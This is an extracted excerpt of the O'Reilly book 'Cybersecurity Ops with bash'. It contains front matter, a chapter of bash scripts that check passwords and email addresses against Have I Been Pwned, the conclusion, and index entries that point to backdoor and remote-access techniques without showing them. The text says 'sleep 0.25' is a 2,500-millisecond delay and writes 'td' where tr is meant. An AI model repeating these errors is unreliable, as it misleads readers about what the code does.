Paul Troncone & 
 Carl Albing, PhD
Cybersecurity  
Ops with bash
Attack, Defend, and Analyze from  
the Command Line
Paul Troncone and Carl Albing
Cybersecurity Ops with bash
Attack, Defend, and Analyze from the
Command Line
Boston
Farnham
Sebastopol
Tokyo
Beijing
Boston
Farnham
Sebastopol
Tokyo
Beijing
978-1-492-04131-3
[LSI]
Cybersecurity Ops with bash
by Paul Troncone and Carl Albing
Copyright © 2019 Digadel Corp & Carl Albing. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://oreilly.com). For more information, contact our corporate/institutional
sales department: 800-998-9938 or corporate@oreilly.com.
Acquisitions Editor: Rachel Roumeliotis
Developmental Editors: Virginia Wilson and John
Devins
Production Editor: Nan Barber
Copyeditor: Sharon Wilkey
Proofreader: Christina Edwards
Indexer: Ellen Troutman-Zaig
Interior Designer: David Futato
Cover Designer: Karen Montgomery
Illustrator: Rebecca Demarest
April 2019:
 First Edition
Revision History for the First Edition
2019-04-01: First Release
2020-04-24: Second Release
See http://oreilly.com/catalog/errata.csp?isbn=9781492041313 for release details.
The O’Reilly logo is a registered trademark of O’Reilly Media, Inc. Cybersecurity Ops with bash, the cover
image, and related trade dress are trademarks of O’Reilly Media, Inc.
The views expressed in this work are those of the authors, and do not represent the publisher’s views.
While the publisher and the authors have used good faith efforts to ensure that the information and
instructions contained in this work are accurate, the publisher and the authors disclaim all responsibility
for errors or omissions, including without limitation responsibility for damages resulting from the use of
or reliance on this work. Use of the information and instructions contained in this work is at your own
risk. If any code samples or other technology this work contains or describes is subject to open source
licenses or the intellectual property rights of others, it is your responsibility to ensure that your use
thereof complies with such licenses and/or rights.
To Erin and Kiera. You bring joy to every moment of my life.
—Paul
 
To Cynthia, and our sons Greg, Eric, and Andrew.
—Carl
Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  xiii
milliseconds from the same IP address.
253
We demonstrate version 2 of the Have I Been Pwned API. The API
transitioned to version 3 as of July 2019, which requires a paid key.
Checking for a Breached Password
The following URL is used to query password information:
https://api.pwnedpasswords.com/range/
For security reasons, Have I Been Pwned does not accept raw passwords. Passwords
must be provided in the form of a partial SHA-1 hash. For example, the SHA-1 hash
of the password password is 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8. To com‐
plete the query, you use the first five hexadecimal characters of the hash:
https://api.pwnedpasswords.com/range/5baa6
Have I Been Pwned returns a list of all hash values that begin with the five characters.
This is also done for security purposes so that Have I Been Pwned, or anyone observ‐
ing your interaction, does not know the exact password hash you are querying for.
Once you have the list of hashes, you can search it by using the last 35 hex characters
of your hash. If it appears on the list, your password has been pwned; if not, your
password is likely secure:
1CC93AEF7B58A1B631CB55BF3A3A3750285:3
1D2DA4053E34E76F6576ED1DA63134B5E2A:2
1D72CD07550416C216D8AD296BF5C0AE8E0:10
1E2AAA439972480CEC7F16C795BBB429372:1
1E3687A61BFCE35F69B7408158101C8E414:1
1E4C9B93F3F0682250B6CF8331B7EE68FD8:3533661
20597F5AC10A2F67701B4AD1D3A09F72250:3
20AEBCE40E55EDA1CE07D175EC293150A7E:1
20FFB975547F6A33C2882CFF8CE2BC49720:1
The number that appears after the colon on each line indicates the total number of
breached accounts that have used that password. Not surprisingly, the password pass
word has been used by many accounts.
Example 22-1 shows how this process can be automated by using bash and the curl
command.
Example 22-1. checkpass.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# checkpass.sh
#
254 
| 
Chapter 22: Tool: Account Auditing
# Description:
# Check a password against the
# Have I Been Pwned? database
#
# Usage: ./checkpass.sh [<password>]
#   <password> Password to check
#   default: read from stdin
#
if (( "$#" == 0 ))                              
then
    printf 'Enter your password: '
    read -s passin                              
    echo
else
    passin="$1"
fi
passin=$(echo -n "$passin" | sha1sum) 
          
passin=${passin:0:40}
firstFive=${passin:0:5}                         
ending=${passin:5}
pwned=$(curl -s "https://api.pwnedpasswords.com/range/$firstFive" | \
        tr -d '\r' | grep -i "$ending" )        
passwordFound=${pwned##*:}                      
if [ "$passwordFound" == "" ]
then
    exit 1
else
    printf 'Password is Pwned %d Times!\n' "$passwordFound"
    exit 0
fi
This checks to see whether the password was passed in as an argument; if not, it
will prompt the user for the password.
The -s option is used with read, so it does not echo what the user is typing to the
screen. This is a best practice when prompting for passwords or other sensitive
information. When using the -s option, a newline won’t be echoed when you
press the Enter key, so we add an empty echo statement after the read statement.
Converts the entered password into an SHA-1 hash. The next line uses the bash
substring operation to extract the first 40 characters, removing any extra charac‐
ters sha1sum may have included with its output.
Checking for a Breached Password 
| 
255
The first five characters of the hash are stored in the variable firstFive, and
characters 6 through 40 are stored in ending.
The Have I Been Pwned website is queried using the REST API URL and the first
five characters of the password hash. The returned result is coming from the web
and thus contains both return (\r) and newline characters (\n). We remove the
return character to avoid confusion in a Linux environment. The result is
searched using grep and characters 6 through 40 of the password hash. The -i
option is used to make grep case-insensitive.
To extract the number of times it has been pwned, we remove the leading hash;
that is, all the characters up to, and including, the colon. This is the shell prefix
removal, where the double hashtag means “the longest possible match,” and the
asterisk is the pattern that matches any characters.
Note that checkpass.sh will exit with a status code of 0 if the password is found, and 1
if the password is not found. This is behavior similar to grep and certain other shell
commands that search for something. If the search is unsuccessful, the result is an
error (nonzero) return (though in the case of being pwned, you might consider it a
“success” not to be found).
To use the script, simply pass in the password on the command line or enter it when
prompted:
$ ./checkpass.sh password
Password is Pwned 3533661 Times!
Be cautious of passing in passwords as command-line arguments,
as they are visible in a full listing of process status (see the ps com‐
mand) and may be saved in your bash history file. Reading the
password from stdin (e.g., when prompted) is the preferred
method. If the script is part of a more complex command pipeline,
make the password the first line to be read from stdin.
Checking for a Breached Email Address
Checking for a breached email address is a little less complicated than checking for a
password. To begin, you need the API URL:
https://haveibeenpwned.com/api/v2/breachedaccount/
You append the email address you want to query for to the end of the URL. The API
will return a list of breaches the email address has been involved with in a JSON for‐
mat. A large amount of information is included, such as the name of the breach, asso‐
256 
| 
Chapter 22: Tool: Account Auditing
ciated domain, and a description. If the email is not found in the database an HTTP
404 status code will be returned.
Example 22-2 shows you how to automate this process.
Example 22-2. checkemail.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# checkemail.sh
#
# Description:
# check an email address against the
# Have I Been Pwned? database
#
# Usage: ./checkemail.sh [<email>]
#   <email> Email address to check; default: reads from stdin
#
if (( "$#" == 0 )) 
then
 
printf 'Enter email address: '
 
read emailin
else
 
emailin="$1"
fi
pwned=$(curl -s "https://haveibeenpwned.com/api/v2/breachedaccount/$emailin") 
if [ "$pwned" == "" ]
then
 
exit 1
else
 
echo 'Account pwned in the following breaches:'
 
echo "$pwned" | grep -Po '"Name":".*?"' | cut -d':' -f2 | tr -d '\"' 
 
exit 0
fi
Checks whether the email address was passed as an argument; if not, it will
prompt the user.
Query the Have I Been Pwned? website.
If a response was returned, perform a simple JSON parsing and extract the Name
name/value pair. See Chapter 11 for more details on JSON processing.
To use checkemail.sh, pass in an email address as an argument or enter it when
prompted:
Checking for a Breached Email Address 
| 
257
$ ./checkemail.sh example@example.com
Account pwned in the following breaches:
000webhost
AbuseWithUs
Adobe
Apollo
.
.
.
Let’s look at two other variations on this script. The first is shown in Example 22-3.
Example 22-3. checkemailAlt.sh
#!/bin/bash
#
# checkemail.sh - check an email address against
#                 the Have I Been Pwned? database
#
if (( "$#" == 0 ))                     
then
    printf 'Enter email address: '
    read emailin
else
    emailin="$1"
fi
URL="https://haveibeenpwned.com/api/v2/breachedaccount/$emailin"
pwned=$(curl -s "$URL" |  grep -Po '"Name":".*?"' )   
if [ "$pwned" == "" ]
then
    exit 1
else
    echo 'Account pwned in the following breaches:'   
    pwned="${pwned//\"/}"         # remove all quotes
    pwned="${pwned//Name:/}"      # remove all 'Name:'
    echo "${pwned}"
    exit 0
fi
As with the previous script, use the argument count to tell whether the user has
supplied sufficient arguments, and if not, prompt the user.
Rather than return all the output from the curl command only to have to grep
through it later, this version of the script does the grep at this point. This is
slightly more efficient because we invoke only a subshell (via the $() construct)
258 
| 
Chapter 22: Tool: Account Auditing
once rather than twice (here, for the curl, and later for the grep) as is done in the
original script.
Rather than using cut and tr to edit the results, we use the bash variable substi‐
tutions. This is more efficient because it avoids the system overhead involved in
the fork and exec system calls needed to invoke the two additional programs
(cut and tr).
Will you notice the improved efficiencies on a single execution of this script? Not
likely, but it’s worth knowing the difference in case you ever write a script that loops
over many such invocations.
Example 22-4 provides one more variation on the script, with an emphasis on terse‐
ness.
Example 22-4. checkemail.1liner
#!/bin/bash
#
# checkemail.sh - check an email address against
#                 the Have I Been Pwned? database
# 
 
  in 1 line
EMAILIN="$1"
if (( "$#" == 0 ))                     
then
    printf 'Enter email address: '
    read EMAILIN
fi
EMAILIN="https://haveibeenpwned.com/api/v2/breachedaccount/$EMAILIN"
echo 'Account pwned in the following breaches:'
curl -s "$EMAILIN" | grep -Po '"Name":".*?"' | cut -d':' -f2 | tr -d '\"'  
This is the same check as before, but we’ll use only one shell variable, EMAILIN,
rather than introduce a second variable URL, to hold the full URL.
This script uses the longer pipeline so that we can do all the manipulation in one
line. Using the shell variables to parse out our results may be more efficient but
requires multiple lines of code. Some programmers like to be terse. Notice,
though, the one difference in behavior for this script: the heading is still printed
even if there is no other output (i.e., the address was not pwned).
We showed these three variations on the script to demonstrate some of the variety
you may find and may use in writing shell scripts. There isn’t necessarily a single way
to accomplish your task, but rather lots of trade-offs in both substance and style.
Checking for a Breached Email Address 
| 
259
Batch-Processing Emails
If you need to check multiple email addresses against the Have I Been Pwned? data‐
base, you can add automation to handle that. Example 22-5 reads in a specified file
that contains a list of email addresses and executes the checkemail.sh script for each
item. If an email address was involved in a breach, it will be printed to the screen.
Example 22-5. emailbatch.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# emailbatch.sh
#
# Description:
# Read in a file of email addresses and run them
# against Have I Been Pwned
#
# Usage: ./emailbatch.sh [<filename>]
#   <filename> File with one email address on each line
#   default: reads from stdin
#
cat "$1" | tr -d '\r' | while read fileLine 
 
do
 
./checkemail.sh "$fileLine" > /dev/null 
 
if (( "$?" == 0 )) 
 
then
 
 
echo "$fileLine is Pwned!"
 
fi
 
sleep 0.25 
 
done
Read in the file passed in via the first argument. It is piped through the td com‐
mand to remove any Windows line breaks so it is not included as part of the
email address.
Run the checkemail.sh script and pass in the email address as an argument. The
output is redirected to /dev/null, so it does not appear on the screen.
Use $? to check the exit status of the last command run. Checkemail.sh will return
0 if the email is found, 1 if not found.
A 2,500-millisecond delay to make sure the script does not exceed the Have I
Been Pwned? rate limit.
260 
| 
Chapter 22: Tool: Account Auditing
To run emailbatch.sh, pass in a text file that contains a list of email addresses:
$ ./emailbatch.sh emailaddresses.txt
example@example.com is Pwned!
example@gmail.com is Pwned!
Summary
Email addresses and passwords should be checked regularly to determine whether
they have been exposed as part of a major data breach. Encourage users to change
passwords that are known to be pwned, as they are highly likely to be part of attacker
password dictionaries.
Workshop
1. Update checkpass.sh so that it can also accept an SHA-1 hash of a password as a
command-line argument.
2. Create a script similar to emailbatch.sh that can read in a list of SHA-1 password
hashes from a file and use checkpass.sh to see if they are compromised.
3. Combine checkpass.sh, checkemail.sh, and emailbatch.sh into a single script.
Visit the Cybersecurity Ops website for additional resources and the answers to these
questions.
Summary 
| 
261
CHAPTER 23
Conclusion
As you have seen throughout this book, the command line and its associated script‐
ing capabilities and tools are an invaluable resource for the cybersecurity operator. It
can be compared to an infinitely reconfigurable multitool. By piping together a
thoughtful series of commands, you can create a single-line script that performs
extremely complex functions. For even more functionality, you can create multiline
scripts.
The next time you are faced with an operational challenge, try to solve it by using the
command line and bash before you reach for a premade tool. Over time you will
develop your skills and one day be able to dazzle others with your command-line wiz‐
ardry.
We encourage you to contact us at the Cybersecurity Ops website with questions and
examples of scripts you have created that have made your operations more produc‐
tive.
Happy scripting!
echo 'Paul and Carl' | sha1sum | cut -c2,4,11,16
263
Index
Symbols
! (exclamation mark)
bang, 214, 250
negating characters in pattern matching, 21
!! (history) operator, 61
" " (quotation marks, double)
field separator in user-agent strings, 106
no pattern matching in, 22
surrounding strings in echo command, 12
#! (shebang) line, 9
$ (dollar sign)
bash prompt, 2
in regular expressions, 34
inside double parentheses, 16
preceding variable names, 12, 54
$# shell variable
giving total number of function arguments,
20
returning total number of parameters in a
script, 13, 52
$'string' construct, 53
$( ) syntax, 259
running command in a subshell, 12
running function in a subshell, 20
$(( )) dollar-double-parens syntax, 194
$0 identifier
functions and, 20
parameter holding script name, 13
$1, $2, etc. (positional parameters), 18, 54
for parameters passed into scripts, 13
indicating function arguments, 20
shifting, 66
$? variable, 14, 66, 204, 241
$HOSTNAME variable, 241
$PATH variable, 241
${!cnt[@]} syntax, getting array index values
used, 92, 103
awk functionality, 104
${VAR/old/new} syntax, 53
${var[index]} syntax, referencing array ele‐
ments, 92
% operator, 53
%! in vi editor, 148
%% operator in pattern matching, 58, 250
%()T printf format specifier for date and time,
124
& (bitwise and) operator, 194
& operator, running commands in background,
8
&& (double ampersand), conditional execution
with, 16
&> (redirection) operator, 7, 8
&>> (redirection) operator, 8
' ' (quotation marks, single)
enclosing regular expressions, 153
no pattern matching in, 22
surrounding strings in echo command, 12
( ) (parentheses)
grouping in regular expressions, 30, 153
in function definitions, 19, 69
(( )) (double parentheses), 194
if statement conditional in, 52
looping with, 18
numeric computation in, 98
numerical comparisons with < operator, 16
success/failure values in, 14
(?s) pattern-match modifier in regular expres‐
sions, 81
265
* (asterisk)
in pattern matching, 20, 66
in regular expressions, 30, 82
wildcard character, 59
+ (plus sign)
in regular expressions, 30
increment operator, 17
. (dot)
.* (zero or more instances of any character),
106
.*? (lazy quantifier) in regular expressions,
152
in pattern matching, 59
in regular expressions, 29
/ (slash)
// (double slash) in wevtutil arguments, 49
in HTML end tags, 160
in Windows command prompt, 49
0 (zero), success or true value, 14
: (colon)
following options, 65
translating to vertical bars with tr com‐
mand, 77
:- variable operator, 66
; (semicolon)
separating commands, 16, 183
terminating find command expression, 60
trailing ; within {} used to group commands,
168
< (less than) operator, testing value of a variable
in if statement, caution with, 16
< (redirection) operator, 6, 124
<& redirection operator, 126
= (assignment) operator, 12
== (equal to) operator, 102
=∼ operator, 106
comparison in [[ compound command, 27
> (greater than) operator
numeric comparisons within double paren‐
theses, 52
> (redirection) operator, 6
>& (redirection) operator, 7
>> (redirection) operator, 7, 84
? (question mark)
in pattern matching, 21
in regular expressions, 29
[ ] (square brackets)
accessing array elements, 83
array operator, 83
for test command, 15
if expressions in, 52
in pattern matching, 21, 65
in regular expressions, 31
[[ ]] (double brackets) syntax, 15
=∼ comparison in, 27
enclosing character classes in regular
expressions, 32
for character classes in pattern matching,
21
making tests without if statement, 17
\ (backslash)
disabling special meaning with read -r, 195
escaping regular expression metacharacters,
29
escaping special characters, 53
escaping, using \\, 77
translating forward slashes to, using tr, 77
\1, \2, \3, etc., in regular expression back
references, 34
\b (word boundary) in regular expressions, 34
\n (newline) character, 53, 77, 179, 256
\r return character, 53, 77, 179, 256
^ (caret)
bitwise XOR operator, 191
in regular expressions, 34, 153
negating characters in pattern matching, 21
negating characters in regular expressions,
82
{ } (curly braces)
defining quantifiers in regular expressions,
34
enclosing function body, 19
enclosing JSON objects, 82
evaluating a shell variable, 18
generating sequence of numbers or single
characters, 19
grouping statements with, 168
| (pipe symbol), 7
logical OR operator, 31
translating colons to, using tr, 77
||, conditional execution with, 16
~ (like) operator in awk, 102
A
absolute paths, 69
access control lists (ACLs)
on Linux, 226
on Windows, 226
266 
| 
Index
access time (last) for files, 62
access.log file, 89
script reading and outputting as HTML, 162
account auditing tool, 253-261
checking for breached email address, 256
batch processing emails, 260
checking for breached password, 254
Have I Been Pwned? website, 253
active reconnaissance, 39
Advanced Encryption Standard (AES) algo‐
rithm, 188
Advanced Packaging Tool (APT), 238
Adversarial Tactics, Techniques & Common
Knowledge (ATT&CK) framework
(MITRE), 42
aggregating data, 84
anchors in regular expressions, 34
anomalies in data, identifying, 104-107
Apache web server access logs, 89
combined log format fields, 89
HTTP status codes, 90
APIs
REST API URL for Have I Been Pwned?
website, 256
VirusTotal, obtaining API key, 150
appending to a file in redirection of output, 7
application whitelisting, 237
apt command, 238
arguments, 5
function, 20
arithmetic expressions in double parentheses
(( )), 52
arrangement and display of data, 90
arrays, 127
indexes, 99
iterating over an associative array, 104
JSON, 83
ASCII
conversions to and from other encodings,
146
converting to/from integer values in
askey.sh script, 196
extracting strings from, 149
assignment, 69
string values to variables, 12
variable values for duration of command
only, 127
variables in read command, 92
associative arrays, 92
declaring, 98
in pagereq.sh script, 103
iterating through indices in summer.sh and
histogram.sh, 102
attacks
information resources on techniques, 42
life cycle, 39-42
complete mission phase, 41
escalate privileges phase, 40
establish foothold phase, 40
initial exploitation phase, 40
internal reconnaissance phase, 41
lateral movement phase, 41
maintain presence phase, 41
reconnaissance phase, 39
attrib command, 60
attribute values in XML, 80
authentication, 38
SSH or SCP within scripts, caution with, 70
automation
batch processing email checks, 260
of filesystem monitoring, 137-141
automation of network monitoring, 127
availability
about, 38
system availability monitoring tool, 233-236
implementation, 234-236
ping command, 233
awk command, 73
-f option, 73
example, printing each line for user's last
name, 73
extracting access.log entries for a data, 102
finding page request from a system and pip‐
ing to countem.sh script, 102
iterating through CVS file, 79
pagereq.awk script, 103
regular expressions in, 27
script using awk to analyze JSON response
from VirusTotal, 154
using to count occurrences, 92
countem.awk script, 92
using to filter on an IP address, 94
using with sort to sort strings by length, 150
B
back references in regular expressions, 33
backdoors
creating, 208-210
Index 
| 
267
bash single-line backdoor, 209
reverse SSH, 208
surviving system reboot, 216
persistent,left by attackers, 41
background, running commands in, 8
banner grabbing, automated, 175-180
bannergrabber.sh script, 177
modification of a banner, 176
base64 command, 181
Base64 encoding in vi editor, 149
baseline of a filesystem
creating, 134
detecting changes in, 135-137
bash
about, 11
advantages of, 2
conditionals, 14-17
functions, 19
information resources, xiv
input, 13
looping in, 17-19
obfuscating script syntax, 183
output, 11
pattern matching, 20
variables, 12
well-formatted code, 182
bash command, 4
running on remote system, 50
batch processing email checks, 260
beaconing, 41
bg (background) command, 8
/bin directory, 241
/bin/sh or /bin/bash files, serving, 111
<body> tag (HTML), 161
branching without explicit if/then statement, 16
break statement, 126
browser history, 45
browsers, identifying with user-agent strings,
104
brute-forcing, 40
buffer overflows, 200
buffers, command-line, 110
built-ins, 5
bulleted lists in HTML, 161
C
C language, source code for fuzzme.exe, 200
case statements, 65
in software inventory script, 241
in validateconfig.sh script, 250
cat command, 84, 180
using with here document to print HTML,
164
Center for Internet Security (CIS), Controls
page, 109
certificates (SSH), 70
character classes
in pattern matching, 21
in regular expressions, 31
character classes in regular expressions
predefined (or shortcuts), 31
checkemail.sh script, 256, 260
checkpass.sh script, 254
chmod command, 219
granting permissions, 225
chown command, 220, 225
cleanup function
calling upon exit, 116
in bannergrabber.sh script, 179
cleanup function, calling upon exit, 168
code examples from this book, xv
combined[] variable, 201
command history, 45
command line, 1-10
basics, 4-9
commands, arguments, built-ins, and
keywords, 5
redirection and piping, 6-8
running commands in background, 8
shell scripts, 9
stdin, stdout, and stderr, 6
buffers, 110
defined, 1
example of use in this book, 2
command-line fuzzer tool, 199-205
fuzzme.exe script, 200
implementation, 200-204
C source code for fuzzme.exe, 200
fuzzer.sh script, 201
requirements for fuzzer.sh, 199
commands
files, built-ins, and keywords, 5
in command.txt file for getlocal.sh script, 55
in vi editor, 144
storing output of shell command, 12
success/fail values, 14
compgen command, 5
complete mission phase (attacks), 41
268 
| 
Index
conclusion phase, 42
(see also complete mission phase)
conditionals, 14-17
confidentiality, 37
configuration, validating (see validating config‐
uration, tool for)
content in files, searching for, 62
continue statement, 57
control structures, 11
countem.awk script, 92
countem.sh script, 91
counting page requests from a system, 102
counting occurrences in data, 91-95
cp command, 63, 84
-p option, 66
crontab command, 129
common options, 122
cross-site scripting (XSS), 40
cryptographic hash functions, 67
creating SHA-1 hash of every file on a sys‐
tem, 133
cryptography, 187
components of a cryptographic system, 187
creating your own, 190-197
cryptographic keys, 188
decryption, 187
encrypting the script, 188
encryption, 187
CSV (comma-separated values) files, 78
iterating through, 79
processing by character position, 80
curl command, 143
capturing an HTTP header, 176
common options, 144
example of use, 144
GET request to VirusTotal to scan a URL,
156
in checkpass.sh script, 254
inability to crawl entire website or follow
links, 174
interfacing with VirusTotal, 150
POST request to VirusTotal to scan a file,
156
sending REST request to VirusTotal, 151
using to copy web pages, 174
using to grab banner in HTTP connections,
180
cut command, 46, 67
common options, -c, -d, and -f, 46
example, 46
extracting data by character position using -
c option, 80
extracting date/time field from access.log
file, 101
extracting fields from delimited files, 79
extracting IP address field from access log,
93
in countem.awk script, 93
in countem.sh script, 91
piping awk command output into, 94
for page request from a system, 102
piping egrep output into, 60
piping grep output into
from JSON processing, 83
using to extract name from CSV file, 78
using with summer.sh script, 95
cybersecurity
about, 37
defining principles
authentication, 38
availability, 38
confidentiality, 37
integrity, 38
nonrepudiation, 38
Cygwin, 3
D
dashboards, creating, 165-169
example output of webdash.sh script, 168
for system availability monitoring, 234-236
webdash.sh script, 165
data analysis (for defensive security), 87-108
commands in use, 87-88
sort command, 87
uniq command, 88
counting occurrences in data, 91-95
displaying data in a histogram, 96-102
finding uniqueness in data, 102-104
identifying anomalies in data, 104-107
sorting and arranging data, 90
totaling numbers in data, 95
web server access log familiarization, 89
data collection (for defensive security), 45-71
commands in use, 46-49
cut command, 46
file command, 47, 47
head command, 48
reg command, 48
Index 
| 
269
wevtutil, 48
data of interest for defensive operations, 45
gathering system information, 49-59
Linux logfiles, 50
remote command execution using SSH,
50
searching the filesystem, 59-69
by file size, 60
by file type, 63
by filename, 59
by message digest value, 67
by time, 61
for content in files, 62
for hidden files, 59
transferring data, 69
data processing (for defensive security), 73-86
aggregating data, 84
commands in use, 73-77
awk command, 73
join command, 74
tail command, 76
tr command, 76
processing an XML document, 80-82
processing delimited files, 78-80
by character position, 80
iterating through delimited files, 79
processing JSON, 82-84
date command, 114
dates and time, formatting in printf output, 124
Debian Linux
dpkg command, 238
installing wget command on, 175
decimal files, conversions of, 146
decryption
cyphertext with XOR method, 191
Dcrypt function in streamcipher.sh, 194
defined, 187
defensive security operations with bash
data analysis, 87-108
data collection, 45-71
data processing, 73-86
filesystem monitoring, 133-142
formatting and reporting data, 159-169
malware analysis, 143-157
network monitoring, 121-131
real-time log monitoring, 109-119
delimited files, processing, 78-80
by character position, 80
iterating through, 79
delimiters
-t option in join, 85
handling by cut command, 47
/dev/null file
redirecting output to, 7
redirecting stderr to, 59
/dev/tcp file descriptor, 122, 176, 209
/dev/udp file descriptor, 209
dictionaries (see associative arrays)
digits, specifying ranges in regular expressions,
31
dir command, 60
discarding standard output, 7
do and done keywords, 17, 18
domains, scanning by VirusTotal, 156
dpkg command, 238
dynamic analysis, 143
E
echo command, 11
automatically appending line feed to output,
147
avoiding redirection on each echo state‐
ment, 140
in dashboard script, 168
redirection of stdin to /dev/tcp/, 124
redirections in banner grabber script, 179
editors, 129
egrep command, 28
--line-buffered option, 110
buffering of output, 110
extracting strings from a file, 149
IOC regex patterns, searching for, 112
monitoring Apache access log with, 110
piping file command output into, 67
piping output into cut command, 60
regular expressions in
back references, 33
finding hidden files, 60
shortcuts not supported, 32
using . (dot) metacharacter, 29
ELF (Executable and Linkable Format), 147
email addresses, exposure in data breach, 253
checking for, 256
emailbatch.sh script, 260
encryption
ciphertext with XOR method, 191
defined, 187
Ncrypt function in streamcipher.sh, 193
270 
| 
Index
end tags (HTML), 160
(see also start tags and end tags)
endianness of files, 148
error messages
redirecting, 7
redirecting to log file, 134
stderr, 6
errors
error or false value after running commands
or programs, 14
suppressing when searching filesystem with
find, 59
escalate privileges phase (attacks), 40
establish foothold phase (attacks), 40
establishing a foothold, 207-216
custom remote access with bash script,
210-215
localrat.sh script, 211
remoterat.sh script, 214
nc command to establish network connec‐
tions, 207
single-line backdoors, 208-210
bash backdoor, 209
reverse SSH connection, 208
surviving system reboot, 216
/etc/group file, 222
/etc/passwd and /etc/shadow files, 111
eval command, 182, 189, 215
eventcreate command, 229, 230
events
event ID on Windows, 230
event types on Windows, 230
log names on Windows, 230
exec command, 179, 214
executables
analyzing with xxd, 147
fuzzing command-line arguments of, 199
identifying on Linux and Windows, 241
implementation of fuzzme.exe, 200
execute permission, 9, 129
files with, finding in Linux, 242
extglob shell option, 22
F
false, indicating with nonzero values, 14
fg (foreground) command, 8
file command, 47
common options, -f, -k, and -z, 47
determining output for executable files, 242
example, 47
identifying file type, 63
piping egrep output into to identify file
type, 67
using on untrusted system, caution with, 67
file descriptors
/dev/tcp, 122
/dev/tcp and dev/udp, 209
reading from two different streams of input,
126
redirecting both stdout and stderr to stdin,
210
setting up for script to read input from two
different files, 127
stdin, stdout, and stderr, 6
file permissions, 219, 225-228
making bulk changes in, 227
on Linux, 225
on Windows, 226
file test operators, 15
files, 5
identifying new files on the filesystem, 136
line endings in Windows vs. Linux and
macOS, 77
processing delimited files, 78-80
reputation of, 150
scanning by VirusTotal, 156
filesystem monitoring tool, creating, 133-142
automation and notification, 137-141
baselining the filesystem, 134
detecting changes in baseline, 135-137
sdiff command, 133
filesystem, searching, 59-69
by file size, 60
by file type, 63
by filename, 59
by message digest value, 67
by time, 61
for content in files, 62
for hidden files, 59
find command, 59
-exec option, piping output into file com‐
mand, 66
-iname and -name options, 59
-type option, 62
combining with grep to copy files to speci‐
fied directory, 62
finding files by size, 60
Index 
| 
271
finding files by time last accessed or modi‐
fied, 61
finding hidden files beginning with . (dot),
59
finding new files and creating list of, 136
finding system data, 84
in typesearch.sh script, 66
making bulk changes in file permissions,
227
searching Windows for .exe files, 242
using with sha1sum command to compute
hash value of every file in a system, 134
with -exec option, using with Windows
attrib command, 60
flushing buffers, 110
for loops, 18
in dashboard script, 167
in fuzzer.sh script, 203
in getlocal.sh script, 57
in useragents.sh script, 106
iterating over an array, 100
iterating over an associative array, 98
iterating through list of values, 18
iterating through parameters in shell scripts
or functions, 18
formatting data, 159-169
for display and print, using HTML, 160-165
tput command, 159
ftp command, 173
capturing banner from FTP server, 176
specifying port for connection, 173
FTP servers, display of banners, 175
function keyword, 69
functions, 19
arguments, 20
defining to draw a bar of a histogram
(pr_bar), 98
defining to find a mismatch in user-agent
strings, 106
invoking, 19
logic obfuscation in scripts, 184
nondescript names for, in script obfusca‐
tion, 183
returning values, 20
G
GET requests (HTTP), 156
getfacl command, 220, 226, 226
getlocal.sh script, 55
getopts command, 65, 140
Git Bash, 2
downloading and installing on Windows, 3
eventcreate command example, 231
exporting entire Windows Registry to a file,
58
paths to, 130
running ping command, 233
using sha1sum command in, 135
grep -E command, egrep and, 29
grep command, 15, 59
analyzing JSON response from VirusTotal
with, 152
buffering of output, 110
combining with find to copy files to speci‐
fied directory, 62
combining with tail to monitor Apache
access logs, 109
common options, 28
egrep, 28
getting 404 errors for an IP address, 93
in checkmail.sh script, 258
in typesearch.sh script, 66
regular expressions in, 27
character classes within double brackets,
32
using grep -P to support shortcuts, 32
searching output from awk, 79
searching return from password breach
checking, 256
searching through XML and extracting data
from tags, 81
using to process JSON, 83
using with -r option to search directories
recursively, 62
groupadd command, 220, 222
grouping in regular expressions, 30
groups, 222
(see also users, groups, and permissions)
manipulating in Windows, 224
viewing all groups associated with a user on
Windows, 224
groups command, 223
gsub function (awk), 155
-gt operator, 52
H
hash algorithms, 67
272 
| 
Index
creating SHA-1 hash of every file on a sys‐
tem, 133
hash formats
searching VirusTotal database by hash
value, 151
SHA-1 hash for passwords, 254
supported by VirusTotal, 151
